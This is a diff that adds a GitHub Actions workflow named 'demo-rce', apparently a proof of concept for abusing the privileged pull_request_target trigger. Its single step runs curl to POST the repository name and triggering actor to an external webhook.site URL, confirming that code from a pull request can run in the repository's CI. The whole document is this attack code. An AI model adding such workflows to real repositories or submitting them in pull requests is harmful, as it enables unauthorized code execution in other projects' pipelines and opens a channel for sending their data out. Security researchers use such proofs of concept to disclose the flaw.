@@ -1,0 +1,14 @@
+name: demo-rce
+on:
+  pull_request_target:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Proof of concept – send callback
+        run: |
+          echo "PoC triggered from pull_request_target"
+          curl -X POST https://webhook.site/3e3e91bd-f198-4f52-8ac5-91ae18e1280c \
+            -H "Content-Type: application/json" \
+            -d '{"event":"pr_target_poc","repo":"${{ github.repository }}","actor":"${{ github.actor }}"}'
